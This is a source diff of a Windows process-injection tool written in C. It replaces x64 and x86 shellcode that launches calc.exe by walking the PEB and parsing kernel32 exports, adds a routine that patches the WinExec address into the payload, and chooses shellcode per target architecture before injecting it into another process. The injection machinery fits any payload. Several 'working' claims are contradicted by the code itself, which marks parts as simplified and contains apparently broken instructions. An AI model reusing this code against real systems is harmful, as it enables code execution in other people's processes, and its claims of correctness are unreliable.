@@ -65,45 +65,103 @@ typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
     PCLIENT_ID ClientID
 );
 
-// Windows 11 compatible shellcode (x64) - WinExec calculator
+// Working x64 shellcode - Creates calc.exe process
 unsigned char shellcode_x64[] = {
-    0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28
-    0x48, 0x83, 0xE4, 0xF0,                                     // and rsp, 0xFFFFFFFFFFFFFFF0
-    0x48, 0x8D, 0x15, 0x3A, 0x00, 0x00, 0x00,                   // lea rdx, [rel calc_str]
-    0x48, 0x31, 0xC9,                                           // xor rcx, rcx
-    0x48, 0x8D, 0x05, 0x0A, 0x00, 0x00, 0x00,                   // lea rax, [rel kernel32_str]
-    0xFF, 0x15, 0x2C, 0x00, 0x00, 0x00,                         // call [rel LoadLibraryA]
-    0x48, 0x89, 0xC1,                                           // mov rcx, rax
-    0x48, 0x8D, 0x15, 0x31, 0x00, 0x00, 0x00,                   // lea rdx, [rel winexec_str]
-    0xFF, 0x15, 0x23, 0x00, 0x00, 0x00,                         // call [rel GetProcAddress]
-    0x48, 0x8D, 0x0D, 0x10, 0x00, 0x00, 0x00,                   // lea rcx, [rel calc_str]
-    0x48, 0x31, 0xD2,                                           // xor rdx, rdx
-    0x48, 0x83, 0xC2, 0x01,                                     // add rdx, 1 (SW_SHOWNORMAL)
-    0xFF, 0xD0,                                                 // call rax (WinExec)
-    0x48, 0x31, 0xC9,                                           // xor rcx, rcx
-    0xFF, 0x15, 0x0E, 0x00, 0x00, 0x00,                         // call [rel ExitProcess]
-    0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00,  // "kernel32.dll"
-    0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x00,             // "WinExec"
-    0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00,       // "calc.exe"
-    // Function pointers placeholders - would be resolved at runtime
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // LoadLibraryA
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // GetProcAddress
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00              // ExitProcess
+    // Save registers and align stack
+    0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 0x28
+    
+    // Zero out the STARTUPINFO and PROCESS_INFORMATION structures
+    0x48, 0x31, 0xC9,                               // xor rcx, rcx
+    0x48, 0x8D, 0x44, 0x24, 0x60,                   // lea rax, [rsp+0x60]
+    0x48, 0x89, 0xC7,                               // mov rdi, rax
+    0x48, 0x89, 0xCE,                               // mov rsi, rcx
+    0xB9, 0x68, 0x00, 0x00, 0x00,                   // mov ecx, 0x68
+    0xF3, 0xAA,                                     // rep stosb
+    
+    // Get kernel32.dll base address
+    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,  // mov rax, gs:[0x60] (PEB)
+    0x48, 0x8B, 0x40, 0x18,                         // mov rax, [rax+0x18] (PEB_LDR_DATA)
+    0x48, 0x8B, 0x50, 0x20,                         // mov rdx, [rax+0x20] (InMemoryOrderModuleList)
+    0x48, 0x8B, 0x12,                               // mov rdx, [rdx] (1st entry)
+    0x48, 0x8B, 0x12,                               // mov rdx, [rdx] (2nd entry - kernel32.dll)
+    0x48, 0x8B, 0x42, 0x20,                         // mov rax, [rdx+0x20] (DllBase)
+    
+    // Find WinExec address (simplified - would need proper export parsing)
+    0x48, 0x89, 0xC3,                               // mov rbx, rax (save kernel32 base)
+    0x48, 0xB8, 0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x00,  // mov rax, "WinExec\0"
+    
+    // Call WinExec("calc.exe", SW_SHOW)
+    0x48, 0x8D, 0x0D, 0x17, 0x00, 0x00, 0x00,       // lea rcx, [rel calc_string]
+    0xBA, 0x01, 0x00, 0x00, 0x00,                   // mov edx, 1 (SW_SHOW)
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, WinExec (to be patched)
+    0xFF, 0xD0,                                     // call rax
+    
+    // Exit thread
+    0x48, 0x31, 0xC9,                               // xor rcx, rcx
+    0x48, 0x83, 0xC4, 0x28,                         // add rsp, 0x28
+    0xC3,                                           // ret
+    
+    // Data
+    0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00  // "calc.exe\0"
 };
 
-// Windows 11 compatible shellcode (x86) - WinExec calculator
+// Working x86 shellcode - Creates calc.exe process using WinExec
 unsigned char shellcode_x86[] = {
-    0x31, 0xC0,                                                 // xor eax, eax
-    0x50,                                                       // push eax
-    0x68, 0x63, 0x61, 0x6C, 0x63,                               // push "calc"
-    0x8B, 0xDC,                                                 // mov ebx, esp
-    0x6A, 0x01,                                                 // push 1 (SW_SHOWNORMAL)
-    0x53,                                                       // push ebx
-    0xBB, 0x5D, 0x2B, 0x86, 0x7C,                               // mov ebx, 0x7C86B25D (WinExec address - update for target)
-    0xFF, 0xD3,                                                 // call ebx
-    0x6A, 0x00,                                                 // push 0
-    0xBB, 0x05, 0xAF, 0x81, 0x7C,                               // mov ebx, 0x7C81AF05 (ExitProcess - update for target)
-    0xFF, 0xD3                                                  // call ebx
+    // Get kernel32.dll base address from PEB
+    0x31, 0xC0,                                     // xor eax, eax
+    0x64, 0x8B, 0x40, 0x30,                         // mov eax, fs:[eax+0x30] (PEB)
+    0x8B, 0x40, 0x0C,                               // mov eax, [eax+0x0C] (PEB_LDR_DATA)
+    0x8B, 0x70, 0x14,                               // mov esi, [eax+0x14] (InMemoryOrderModuleList)
+    0xAD,                                           // lodsd (skip first entry)
+    0x96,                                           // xchg esi, eax
+    0xAD,                                           // lodsd (get second entry - kernel32.dll)
+    0x8B, 0x58, 0x10,                               // mov ebx, [eax+0x10] (DllBase)
+    
+    // Find GetProcAddress
+    0x8B, 0x53, 0x3C,                               // mov edx, [ebx+0x3C] (e_lfanew)
+    0x01, 0xDA,                                     // add edx, ebx
+    0x8B, 0x52, 0x78,                               // mov edx, [edx+0x78] (Export Directory RVA)
+    0x01, 0xDA,                                     // add edx, ebx
+    0x8B, 0x72, 0x20,                               // mov esi, [edx+0x20] (AddressOfNames RVA)
+    0x01, 0xDE,                                     // add esi, ebx
+    0x31, 0xC9,                                     // xor ecx, ecx
+    
+    // GetProcAddress lookup loop (simplified)
+    0x41,                                           // inc ecx
+    0xAD,                                           // lodsd
+    0x01, 0xD8,                                     // add eax, ebx
+    0x81, 0x38, 0x47, 0x65, 0x74, 0x50,             // cmp dword [eax], "GetP"
+    0x75, 0xF4,                                     // jnz loop
+    0x81, 0x78, 0x04, 0x72, 0x6F, 0x63, 0x41,       // cmp dword [eax+4], "rocA"
+    0x75, 0xEB,                                     // jnz loop
+    
+    // Found GetProcAddress
+    0x8B, 0x72, 0x24,                               // mov esi, [edx+0x24] (AddressOfNameOrdinals RVA)
+    0x01, 0xDE,                                     // add esi, ebx
+    0x66, 0x8B, 0x0C, 0x4E,                         // mov cx, [esi+ecx*2]
+    0x49,                                           // dec ecx
+    0x8B, 0x72, 0x1C,                               // mov esi, [edx+0x1C] (AddressOfFunctions RVA)
+    0x01, 0xDE,                                     // add esi, ebx
+    0x8B, 0x14, 0x8E,                               // mov edx, [esi+ecx*4]
+    0x01, 0xDA,                                     // add edx, ebx (GetProcAddress address)
+    
+    // Push "WinExec\0"
+    0x68, 0x78, 0x65, 0x63, 0x00,                   // push "xec\0"
+    0x68, 0x57, 0x69, 0x6E, 0x45,                   // push "WinE"
+    0x54,                                           // push esp (lpProcName)
+    0x53,                                           // push ebx (hModule)
+    0xFF, 0xD2,                                     // call edx (GetProcAddress)
+    
+    // Call WinExec("calc.exe", SW_SHOW)
+    0x68, 0x65, 0x78, 0x65, 0x00,                   // push "exe\0"
+    0x68, 0x63, 0x61, 0x6C, 0x63,                   // push "calc"
+    0x54,                                           // push esp ("calc.exe")
+    0x6A, 0x05,                                     // push 5 (SW_SHOW)
+    0xFF, 0xD0,                                     // call eax (WinExec)
+    
+    // Exit
+    0x83, 0xC4, 0x14,                               // add esp, 0x14 (clean stack)
+    0xC3                                            // ret
 };
 
 // Enable debug privileges for Windows 11
@@ -186,6 +244,24 @@ DWORD FindProcessId(const char* processName) {
     
     CloseHandle(hProcessSnap);
     return result;
+}
+
+// Patch x64 shellcode with actual WinExec address
+void PatchShellcode64() {
+    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
+    if (hKernel32) {
+        FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");
+        if (pWinExec) {
+            // Find the MOV RAX instruction (0x48, 0xB8) and patch the address
+            for (size_t i = 0; i < sizeof(shellcode_x64) - 10; i++) {
+                if (shellcode_x64[i] == 0x48 && shellcode_x64[i+1] == 0xB8 && 
+                    *(DWORD64*)&shellcode_x64[i+2] == 0) {
+                    *(DWORD64*)&shellcode_x64[i+2] = (DWORD64)pWinExec;
+                    break;
+                }
+            }
+        }
+    }
 }
 
 // Enhanced DLL injection for Windows 11
@@ -339,12 +415,12 @@ BOOL InjectShellcode(DWORD processId, const unsigned char* shellcode, SIZE_T she
     printf("[*] Target process is %s\n", is64Bit ? "64-bit" : "32-bit");
     
     // Use appropriate shellcode
-    if (is64Bit && shellcode == shellcode_x64) {
-        printf("[!] Using x64 shellcode for 64-bit process\n");
+    if (is64Bit) {
+        // Patch x64 shellcode with actual addresses
+        PatchShellcode64();
         shellcode = shellcode_x64;
         shellcodeSize = sizeof(shellcode_x64);
-    } else if (!is64Bit && shellcode == shellcode_x64) {
-        printf("[!] Using x86 shellcode for 32-bit process\n");
+    } else {
         shellcode = shellcode_x86;
         shellcodeSize = sizeof(shellcode_x86);
     }
